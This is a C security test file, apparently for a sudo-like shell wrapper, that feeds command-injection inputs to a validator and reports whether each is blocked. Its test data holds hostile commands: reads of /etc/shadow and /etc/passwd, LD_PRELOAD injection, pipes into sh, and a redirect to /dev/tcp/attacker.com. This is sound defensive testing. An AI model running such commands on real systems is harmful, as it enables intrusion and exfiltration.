#include "test_security_framework.h"

/* Global security test counters */
int security_count = 0;
int security_passes = 0;
int security_failures = 0;

/* Test command injection via shell metacharacters */
int test_shell_metacharacter_injection() {
    struct command_info cmd;
    
    /* Test 1: Command chaining with semicolon */
    if (parse_command("ls; whoami", &cmd) == 0) {
        if (!validate_command("ls; whoami")) {
            free_command_info(&cmd);
            return 0; /* Blocked - secure */
        }
        free_command_info(&cmd);
    }
    
    /* Test 2: Command substitution with backticks */
    if (parse_command("echo `whoami`", &cmd) == 0) {
        if (!validate_command("echo `whoami`")) {
            free_command_info(&cmd);
            return 0; /* Blocked - secure */
        }
        free_command_info(&cmd);
    }
    
    /* Test 3: Command substitution with $() */
    if (parse_command("echo $(whoami)", &cmd) == 0) {
        if (!validate_command("echo $(whoami)")) {
            free_command_info(&cmd);
            return 0; /* Blocked - secure */
        }
        free_command_info(&cmd);
    }
    
    /* Test 4: Pipe injection */
    if (parse_command("ls | sh", &cmd) == 0) {
        if (!validate_command("ls | sh")) {
            free_command_info(&cmd);
            return 0; /* Blocked - secure */
        }
        free_command_info(&cmd);
    }
    
    return 1; /* Vulnerable - attack succeeded */
}

/* Test null byte injection */
int test_null_byte_injection() {
    char malicious_command[256];

    /* Create command with embedded null byte */
    strcpy(malicious_command, "ls");
    malicious_command[2] = '\0';
    strcpy(malicious_command + 3, "; whoami");

    /* Test if null byte injection is blocked using the enhanced validation */
    if (!validate_command_with_length(malicious_command, 11)) { /* "ls" + null + "; whoami" = 11 chars */
        return 0; /* Blocked - secure */
    }

    return 1; /* Vulnerable */
}

/* Test buffer overflow attempts */
int test_buffer_overflow_command() {
    char *long_command = malloc(MAX_COMMAND_LENGTH + 1000);
    if (!long_command) return 0;
    
    /* Create extremely long command */
    memset(long_command, 'A', MAX_COMMAND_LENGTH + 999);
    long_command[MAX_COMMAND_LENGTH + 999] = '\0';
    
    /* Test if long command is blocked */
    int result = validate_command(long_command);
    free(long_command);
    
    if (!result) {
        return 0; /* Blocked - secure */
    }
    
    return 1; /* Vulnerable */
}

/* Test path traversal injection */
int test_path_traversal_injection() {
    const char *traversal_commands[] = {
        "cat ../../../etc/passwd",
        "ls ../../../../root",
        "cd ../../../ && ls",
        "cat ..\\..\\..\\etc\\passwd",
        "ls %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        NULL
    };
    
    for (int i = 0; traversal_commands[i]; i++) {
        if (!validate_command(traversal_commands[i])) {
            continue; /* This one was blocked */
        } else {
            return 1; /* Vulnerable - at least one traversal succeeded */
        }
    }
    
    return 0; /* All blocked - secure */
}

/* Test environment variable injection */
int test_environment_injection() {
    const char *env_commands[] = {
        "env",
        /* printenv is allowed for safe inspection of environment */
        "export MALICIOUS=value; ls",
        "HOME=/tmp ls",
        "PATH=/tmp:$PATH ls",
        "LD_PRELOAD=/tmp/malicious.so ls",
        NULL
    };
    
    for (int i = 0; env_commands[i]; i++) {
        struct command_info cmd;
        if (parse_command(env_commands[i], &cmd) == 0) {
            if (!validate_command(env_commands[i])) {
                free_command_info(&cmd);
                continue; /* Blocked */
            }
            free_command_info(&cmd);
            return 1; /* Vulnerable */
        }
    }
    
    return 0; /* All blocked - secure */
}

/* Test redirection injection */
int test_redirection_injection() {
    const char *redirect_commands[] = {
        "ls > /etc/passwd",
        "echo 'malicious' >> /etc/hosts",
        "cat < /etc/shadow",
        "ls 2>&1 | tee /tmp/output",
        "whoami > /dev/tcp/attacker.com/4444",
        NULL
    };
    
    for (int i = 0; redirect_commands[i]; i++) {
        if (!validate_command(redirect_commands[i])) {
            continue; /* Blocked */
        } else {
            return 1; /* Vulnerable */
        }
    }
    
    return 0; /* All blocked - secure */
}

/* Test special character injection */
int test_special_character_injection() {
    const char *special_commands[] = {
        "ls && whoami",
        "ls || whoami",
        "ls & whoami",
        "ls; whoami",
        "ls | whoami",
        "ls `whoami`",
        "ls $(whoami)",
        "ls ${USER}",
        "ls $USER",
        "ls 'test'",
        "ls \"test\"",
        "ls \\test",
        NULL
    };
    
    for (int i = 0; special_commands[i]; i++) {
        if (!validate_command(special_commands[i])) {
            continue; /* Blocked */
        } else {
            printf("[DEBUG] Allowed special command: %s\n", special_commands[i]);
            return 1; /* Vulnerable */
        }
    }

    return 0; /* All blocked - secure */
}

/* Test unicode and encoding injection */
int test_unicode_injection() {
    const char *unicode_commands[] = {
        "ls\x00whoami",           /* Null byte */
        "ls\x0awhoami",           /* Newline */
        "ls\x0dwhoami",           /* Carriage return */
        "ls\x09whoami",           /* Tab */
        "ls%00whoami",            /* URL encoded null */
        "ls%0awhoami",            /* URL encoded newline */
        "ls\\u0000whoami",        /* Unicode null */
        NULL
    };

    size_t command_lengths[] = {
        11,  /* "ls\x00whoami" - 11 chars including null */
        11,  /* "ls\x0awhoami" - 11 chars */
        11,  /* "ls\x0dwhoami" - 11 chars */
        11,  /* "ls\x09whoami" - 11 chars */
        11,  /* "ls%00whoami" - 11 chars */
        12,  /* "ls%0awhoami" - 12 chars */
        14   /* "ls\\u0000whoami" - 14 chars */
    };

    for (int i = 0; unicode_commands[i]; i++) {
        int result;
        if (i == 0) {
            /* First command has embedded null, use enhanced validation */
            result = validate_command_with_length(unicode_commands[i], command_lengths[i]);
        } else {
            /* Other commands can use regular validation */
            result = validate_command(unicode_commands[i]);
        }

        if (!result) {
            continue; /* Blocked */
        } else {
            return 1; /* Vulnerable */
        }
    }

    return 0; /* All blocked - secure */
}

/* Test format string injection */
int test_format_string_injection() {
    const char *format_commands[] = {
        "printf '%s' /etc/passwd",
        "echo %s%s%s%s",
        "ls %n%n%n%n",
        "cat %x%x%x%x",
        NULL
    };
    
    for (int i = 0; format_commands[i]; i++) {
        if (!validate_command(format_commands[i])) {
            continue; /* Blocked */
        } else {
            return 1; /* Vulnerable */
        }
    }
    
    return 0; /* All blocked - secure */
}

int main() {
    printf("=== Security Tests - Command Injection ===\n");
    
    /* Initialize security test counters */
    security_count = 0;
    security_passes = 0;
    security_failures = 0;
    
    /* Run command injection tests */
    SECURITY_TEST_ASSERT_BLOCKED(test_shell_metacharacter_injection, 
                                 "Shell metacharacter injection (;, |, &&, ||, `, $())");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_null_byte_injection, 
                                 "Null byte injection bypass");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_buffer_overflow_command, 
                                 "Buffer overflow via long command");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_path_traversal_injection, 
                                 "Path traversal injection (../, ..\\)");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_environment_injection, 
                                 "Environment variable injection");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_redirection_injection, 
                                 "I/O redirection injection (>, >>, <, |)");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_special_character_injection, 
                                 "Special character injection");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_unicode_injection, 
                                 "Unicode and encoding injection");
    
    SECURITY_TEST_ASSERT_BLOCKED(test_format_string_injection, 
                                 "Format string injection");
    
    printf("\n=== Command Injection Test Results ===\n");
    printf("Total tests: %d\n", security_count);
    printf("Secure (attacks blocked): %d\n", security_passes);
    printf("Vulnerable (attacks succeeded): %d\n", security_failures);
    
    if (security_failures == 0) {
        printf("✅ All command injection attacks were blocked!\n");
        return 0;
    } else {
        printf("❌ %d vulnerabilities found! Check /tmp/sudosh_vulnerabilities.log\n", security_failures);
        return 1;
    }
}
